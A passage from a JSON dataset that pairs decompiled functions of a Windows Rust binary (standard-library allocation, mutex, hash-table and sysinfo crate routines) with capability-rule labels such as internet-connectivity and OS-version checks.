            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym._L_as_rayon_core::latch::Latch_::set::h0cc38cac03c80abe(int64_t arg1)\n\n{\n    int64_t iStack56;\n    int64_t iStack48;\n    uchar uStack40;\n    int64_t iStack32;\n    uchar uStack24;\n    \n    // <&L as rayon_core::latch::Latch>::set::h0cc38cac03c80abe\n    sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&iStack56, arg1);\n    if (iStack56 == 0) {\n        iStack32 = iStack48;\n        uStack24 = uStack40;\n        *(iStack48 + 9) = 1;\n        sub.KERNEL32.dll_WakeAllConditionVariable(arg1 + 0x10);\n        sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::hb58323b4d892ef68(&iStack32);\n        return;\n    }\n    iStack32 = iStack48;\n    uStack24 = uStack40;\n    dbg.unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", 0x2b, &iStack32, 0x44bd58);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 298
    },
    "b58323b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::hb58323b4d892ef68(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    \n    // core::ptr::drop_in_place<std::sync::mutex::MutexGuard<bool>>::hb58323b4d892ef68\n    iVar1 = *arg1;\n    if ((*(arg1 + 1) == '\\0') && ((*0x452160 & 0x7fffffffffffffff) != 0)) {\n        cVar2 = dbg.is_zero_slow_path();\n        if (cVar2 == '\\0') {\n            *(iVar1 + 8) = 1;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x004410d4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_ReleaseSRWLockExclusive)(iVar1);\n    return;\n}\n",
        "token_count": 216
    },
    "5ed3f0bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.alloc::fmt::format::h5ed3f0bbcb495c5a(ulong *arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *arg1_00;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    // alloc::fmt::format::h5ed3f0bbcb495c5a\n    if (arg2[1] == 1) {\n        if (arg2[5] != 0) goto code_r0x0043d493;\n        pcVar3 = **arg2;\n        arg1_00 = (*arg2)[1];\n    }\n    else {\n        if ((arg2[1] != 0) || (arg2[5] != 0)) {\ncode_r0x0043d493:\n            uStack56 = *arg2;\n            uStack52 = *(arg2 + 4);\n            uStack48 = *(arg2 + 1);\n            uStack44 = *(arg2 + 0xc);\n            uStack40 = *(arg2 + 2);\n            uStack36 = *(arg2 + 0x14);\n            uStack32 = *(arg2 + 3);\n            uStack28 = *(arg2 + 0x1c);\n            dbg.format_inner(arg1, &uStack56);\n            return;\n        }\n        pcVar3 = \n        \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n        ;\n        arg1_00 = NULL;\n    }\n    pcVar2 = pcVar3;\n    uVar1 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(arg1_00);\n    *arg1 = uVar1;\n    arg1[1] = pcVar2;\n    sym.memcpy(uVar1, pcVar3, arg1_00);\n    arg1[2] = arg1_00;\n    return;\n}\n",
        "token_count": 512
    },
    "a0eebb9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::borrow::Cow_B_::into_owned::ha0eebb9e76abe0c6(ulong *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t arg1_00;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    \n    // alloc::borrow::Cow<B>::into_owned::ha0eebb9e76abe0c6\n    if (*arg2 != 0) {\n        arg1[2] = arg2[3];\n        uVar2 = *(arg2 + 0xc);\n        uVar3 = *(arg2 + 2);\n        uVar4 = *(arg2 + 0x14);\n        *arg1 = *(arg2 + 1);\n        *(arg1 + 4) = uVar2;\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xc) = uVar4;\n        return;\n    }\n    iVar1 = arg2[1];\n    arg1_00 = arg2[2];\n    iVar6 = iVar1;\n    uVar5 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(arg1_00);\n    *arg1 = uVar5;\n    arg1[1] = iVar6;\n    sym.memcpy(uVar5, iVar1, arg1_00);\n    arg1[2] = arg1_00;\n    return;\n}\n",
        "token_count": 341
    },
    "3d1cbefd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::process::null_terminated_wchar_to_string::h3d1cbefd382e8919\n               (ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t arg3_00;\n    ulong arg2_00;\n    int64_t iVar1;\n    uchar auStack80 [24];\n    uchar auStack56 [32];\n    \n    // sysinfo::windows::process::null_terminated_wchar_to_string::h3d1cbefd382e8919\n    iVar1 = arg3 * 2;\n    arg3_00 = 0;\n    do {\n        if (iVar1 == 0) {\ncode_r0x0043d8dd:\n            dbg.from_wide(auStack80, arg2, arg3);\n            arg2_00 = dbg.as_inner(auStack80);\n            dbg.to_string_lossy(auStack56, arg2_00, arg2);\n            sym.alloc::borrow::Cow_B_::into_owned::ha0eebb9e76abe0c6(arg1, auStack56);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack80);\n            return;\n        }\n        if (*(arg2 + arg3_00 * 2) == 0) {\n            arg2 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::h09683fc5be074ea2\n                             (arg2, arg3, arg3_00);\n            goto code_r0x0043d8dd;\n        }\n        arg3_00 = arg3_00 + 1;\n        iVar1 = iVar1 + -2;\n    } while( true );\n}\n",
        "token_count": 399
    },
    "963fb965": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.sysinfo::windows::process::get_process_data::h963fb965a607e68b\n               (uint64_t *arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int32_t iVar1;\n    ulong uStack64;\n    ulong uStack56;\n    uint64_t uStack48;\n    \n    // sysinfo::windows::process::get_process_data::h963fb965a607e68b\n    uStack48 = arg4 >> 1;\n    uStack56 = arg2;\n    uStack64 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(uStack48 + 1);\n    iVar1 = sub.KERNEL32.dll_ReadProcessMemory(arg2, arg3, uStack64, arg4, 0);\n    if (iVar1 != 1) {\n        arg1[1] = 0x44c1bd;\n        arg1[2] = 0x1b;\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(&uStack64);\n    }\n    else {\n        arg1[3] = uStack48;\n        *(arg1 + 1) = uStack64;\n        *(arg1 + 0xc) = uStack64._4_4_;\n        *(arg1 + 2) = uStack56;\n        *(arg1 + 0x14) = uStack56._4_4_;\n    }\n    *arg1 = iVar1 != 1;\n    return;\n}\n",
        "token_count": 370
    },
    "0b67e62b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h0b67e62becfb7454(uint64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    int64_t iStack56;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h0b67e62becfb7454\n    uVar2 = arg2 + 1;\n    if (uVar2 == 0) {\n        iStack56 = 0;\n        uStack64 = uVar2;\n    }\n    else {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x18;\n            uStack48 = *arg1;\n            uStack32 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(0x18), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x18) >> 0x40, 0) == 0) << 3, &uStack48);\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n            iStack56 = -0x7fffffffffffffff;\n        }\n    }\n    if (iStack56 != -0x7fffffffffffffff) {\n        if (iStack56 != 0) {\n            uStack48 = 0x43ae1b;\n            dbg.handle_alloc_error(uStack64);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        uStack48 = 0x43ae14;\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "80ea03ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h80ea03ef37d555fd\n                   (uint64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::grow_amortized::h80ea03ef37d555fd\n    uVar2 = arg2 + arg3;\n    if (!CARRY8(arg2, arg3)) {\n        uVar1 = arg1[1] * 2;\n        if (uVar2 < uVar1) {\n            uVar2 = uVar1;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (arg1[1] == 0) {\n            uStack32 = 0;\n        }\n        else {\n            uStack48 = *arg1;\n            uStack32 = 2;\n            uStack40 = uVar1;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c(&iStack72, uVar3 * 2, !CARRY8(uVar3, uVar3) * 2, &uStack48);\n        uVar2 = uStack64;\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 392
    },
    "f1c3e4ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym._sysinfo::windows::disk::Disk_as_sysinfo::traits::DiskExt_::refresh::hf1c3e4ca5a17830b(int64_t lpDirectoryName)\n\n{\n    int32_t iVar1;\n    \n    // <sysinfo::windows::disk::Disk as sysinfo::traits::DiskExt>::refresh::hf1c3e4ca5a17830b\n    if (*(lpDirectoryName + 0x70) != 0) {\n        iVar1 = sub.KERNEL32.dll_GetDiskFreeSpaceExW(*(lpDirectoryName + 0x40), 0, 0);\n        if (iVar1 != 0) {\n            *(lpDirectoryName + 0x78) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "84ebf138": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_core::option::Option_alloc::string::String__::h84ebf13874ce3e56(int64_t *arg1)\n\n{\n    // core::ptr::drop_in_place<core::option::Option<alloc::string::String>>::h84ebf13874ce3e56\n    if (*arg1 == 0) {\n        return;\n    }\n    if (arg1[1] == 0) {\n        return;\n    }\n    if (arg1[1] == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n    return;\n}\n",
        "token_count": 204
    },
    "474d3600": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h474d36004fb7062b\n                  (int64_t *arg1)\n\n{\n    uchar auVar1 [16];\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t in_RDX;\n    uint32_t uVar4;\n    uchar (*pauVar5) [16];\n    int64_t iVar6;\n    \n    // <hashbrown::raw::RawIter<T> as core::iter::traits::iterator::Iterator>::next::h474d36004fb7062b\n    iVar2 = arg1[4];\n    if (iVar2 == 0) {\n        iVar6 = 0;\n    }\n    else {\n        uVar4 = *(arg1 + 3);\n        iVar6 = *arg1;\n        pauVar5 = arg1[1];\n        while( true ) {\n            iVar3 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362(uVar4);\n            if (iVar3 == 1) break;\n            auVar1 = *pauVar5;\n            uVar4 = ~(SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 |\n                      (SUB161(auVar1 >> 0x17, 0) & 1) << 2 | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 |\n                      (SUB161(auVar1 >> 0x27, 0) & 1) << 4 | (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 |\n                      (SUB161(auVar1 >> 0x37, 0) & 1) << 6 | (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 |\n                      (SUB161(auVar1 >> 0x47, 0) & 1) << 8 | (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 |\n                      (SUB161(auVar1 >> 0x57, 0) & 1) << 10 | (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb |\n                      (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd |\n                      (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe | SUB161(auVar1 >> 0x7f, 0) << 0xf);\n            *(arg1 + 3) = uVar4;\n            iVar6 = iVar6 + -0x880;\n            *arg1 = iVar6;\n            arg1[1] = pauVar5[1];\n            pauVar5 = pauVar5[1];\n        }\n        *(arg1 + 3) = uVar4 - 1 & uVar4;\n        iVar6 = iVar6 + in_RDX * -0x88;\n        arg1[4] = iVar2 + -1;\n    }\n    return iVar6;\n}\n",
        "token_count": 782
    },
    "3d2282e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h3d2282e923c20e55(uint64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iStack72;\n    uint64_t uStack64;\n    int64_t iStack56;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h3d2282e923c20e55\n    uVar2 = arg2 + 1;\n    if (uVar2 == 0) {\n        iStack56 = 0;\n        uStack64 = uVar2;\n    }\n    else {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uStack32 = 4;\n        if (uVar2 < 5) {\n            uVar2 = 4;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x10;\n            uStack48 = *arg1;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar2) * ZEXT816(0x10), 0), \n                   (SUB168(ZEXT816(uVar2) * ZEXT816(0x10) >> 0x40, 0) == 0) << 2, &uStack48);\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar2;\n            iStack56 = -0x7fffffffffffffff;\n            uStack64 = uVar2;\n        }\n    }\n    if (iStack56 != -0x7fffffffffffffff) {\n        if (iStack56 != 0) {\n            uStack48 = 0x43ae1b;\n            dbg.handle_alloc_error(uStack64);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        uStack48 = 0x43ae14;\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 559
    },
    "7a03986b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h7a03986b0ed0c4b8(uint64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    int64_t iStack56;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h7a03986b0ed0c4b8\n    uVar2 = arg2 + 1;\n    if (uVar2 == 0) {\n        iStack56 = 0;\n        uStack64 = uVar2;\n    }\n    else {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        uStack32 = 8;\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 8;\n            uStack48 = *arg1;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(8), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(8) >> 0x40, 0) == 0) << 3, &uStack48);\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n            iStack56 = -0x7fffffffffffffff;\n        }\n    }\n    if (iStack56 != -0x7fffffffffffffff) {\n        if (iStack56 != 0) {\n            uStack48 = 0x43ae1b;\n            dbg.handle_alloc_error(uStack64);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        uStack48 = 0x43ae14;\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "fc1ddf98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hfc1ddf983603ee55(uint64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    int64_t iStack56;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hfc1ddf983603ee55\n    uVar2 = arg2 + 1;\n    if (uVar2 == 0) {\n        iStack56 = 0;\n        uStack64 = uVar2;\n    }\n    else {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x88;\n            uStack48 = *arg1;\n            uStack32 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(0x88), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x88) >> 0x40, 0) == 0) << 3, &uStack48);\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n            iStack56 = -0x7fffffffffffffff;\n        }\n    }\n    if (iStack56 != -0x7fffffffffffffff) {\n        if (iStack56 != 0) {\n            uStack48 = 0x43ae1b;\n            dbg.handle_alloc_error(uStack64);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        uStack48 = 0x43ae14;\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "cf9e9d88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n               (int64_t *arg1)\n\n{\n    // core::ptr::drop_in_place<core::option::Option<sysinfo::windows::component::Enumerator>>::hcf9e9d88b61ba464\n    if ((*arg1 != 0) && (arg1[1] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e85d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg1[1] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "1a43ba31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n               (int64_t *arg1)\n\n{\n    // core::ptr::drop_in_place<core::option::Option<sysinfo::windows::component::Instance>>::h1a43ba318d61a6af\n    if ((*arg1 != 0) && (arg1[1] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e82f. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg1[1] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "72763548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n               (int64_t *arg1)\n\n{\n    if ((*arg1 != 0) && (arg1[1] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e846. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg1[1] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "3b916558": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h3b916558db69be83\n                  (int64_t *arg1)\n\n{\n    uchar auVar1 [16];\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t in_RDX;\n    uchar (*pauVar4) [16];\n    uint32_t uVar5;\n    \n    // <hashbrown::raw::RawIter<T> as core::iter::traits::iterator::Iterator>::next::h3b916558db69be83\n    iVar2 = arg1[4];\n    if (iVar2 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        uVar5 = *(arg1 + 3);\n        pauVar4 = arg1[1];\n        while( true ) {\n            iVar3 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362(uVar5);\n            if (iVar3 == 1) break;\n            auVar1 = *pauVar4;\n            uVar5 = ~(SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 |\n                      (SUB161(auVar1 >> 0x17, 0) & 1) << 2 | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 |\n                      (SUB161(auVar1 >> 0x27, 0) & 1) << 4 | (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 |\n                      (SUB161(auVar1 >> 0x37, 0) & 1) << 6 | (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 |\n                      (SUB161(auVar1 >> 0x47, 0) & 1) << 8 | (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 |\n                      (SUB161(auVar1 >> 0x57, 0) & 1) << 10 | (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb |\n                      (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd |\n                      (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe | SUB161(auVar1 >> 0x7f, 0) << 0xf);\n            *(arg1 + 3) = uVar5;\n            *arg1 = *arg1 + -0x1180;\n            arg1[1] = pauVar4[1];\n            pauVar4 = pauVar4[1];\n        }\n        *(arg1 + 3) = uVar5 - 1 & uVar5;\n        iVar3 = in_RDX * -0x118 + *arg1;\n        arg1[4] = iVar2 + -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 763
    },
    "fbf69c3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
